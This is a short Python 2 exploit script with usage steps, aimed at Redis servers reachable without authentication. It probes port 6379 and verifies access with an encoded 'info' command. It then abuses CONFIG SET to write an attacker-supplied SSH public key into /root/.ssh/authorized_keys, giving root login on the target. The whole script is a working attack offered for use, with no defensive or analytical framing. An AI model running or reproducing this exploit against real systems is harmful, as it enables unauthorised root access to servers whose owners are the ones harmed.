'''
this is for redis 

1, generate a key  id_rsa id_rsa.pub 
ssh-keygen -t rsa 

2, change the id_rsa.pub name to foo.txt

3, run the exploit

'''
import redis 
import socket 
import redis
ipaddr = raw_input("IP address: ")

def verify():
    result = {}
    payload = '\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'
    s = socket.socket()
    socket.setdefaulttimeout(10)
    try:
        host = ipaddr
        port = 6379
        s.connect((host,port))
        s.send(payload)
        recvdata = s.recv(2048)
        print recvdata
    except:
        pass
    s.close()

def attack():
    with open('foo.txt') as f:
        file=f.read()
        pool = redis.ConnectionPool(host=ipaddr,port=6379)
        r = redis.Redis(connection_pool=pool)
        r.set('xxx',file)
        r.config_set('dir','/root/.ssh/')
        r.config_set('dbfilename','authorized_keys')
        r.save()
        print r.get('xxx')


def portScanner():
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        res = s.connect((ipaddr,6379))
        print "[+] 6379 open" 
        s.close()
        return True
    except:
        print "[-] target redis close"
        return False

def main():
    if portScanner():
        verify()
        attack()
if __name__ == '__main__':
    main()

